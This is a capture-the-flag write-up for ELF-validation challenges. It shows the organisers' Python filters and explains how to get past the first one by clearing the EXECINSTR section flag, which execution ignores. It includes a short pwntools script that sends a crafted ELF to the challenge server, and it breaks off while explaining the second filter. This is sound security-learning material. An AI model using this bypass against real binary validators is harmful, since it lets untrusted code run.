
1. Extremely Lame Filters 1
2. Extremely Lame Filters 2
3. squ1rrel-logon

If you want to get binary or bytes of ELF probs, DM me(Discord : guardianch)

--- 
# Extremely Lame Filters 1

`elf.py` analyze input ELF file.

```python
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!!"))
elf = parse(data)

for section in elf.sections:
    if section.sh_flags & SectionFlags.EXECINSTR:
        raise ValidationException("!!")

elf.run()
```

`fairy.py` check sections flag of input file. If there is EXECINSTR flag in `sh_flags`, program turns off. However, `sh_flags` doesn't affect execution of the program, so just remove every EXECINSTR flag. funny trick lol. If section's flag is `06`, change it to `02`. After manipulating, send it to server.

# exploit

```python
from pwn import *
import base64

p = remote('20.84.72.194', '5002')
#p = process(['python3', 'fairy.py'])

dt = base64.b64encode(open('./ex_nofilter', 'rb').read())
p.sendlineafter(b'!!', dt)
p.interactive()
```

---
# Extremely Lame Filters 2

`elf.py` is same as last prob.

```python
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!! (almost any)"))
elf = parse(data)

if elf.header.e_type != constants.ET_EXEC:
    print("!!")
    exit(1)

for segment in elf.segments:
    if segment.p_flags & SegmentFlags.X:
        content = elf.content(segment)
        for byte in content:
            if byte != 0:
                print(">:(")
                exit(1)

elf.run()
```

First, `e_type` should be `ET_EXEC`. It means elf must not have any linking. It is resolved by write shellcode and compile it. Second, it check segment's `p_flags`.  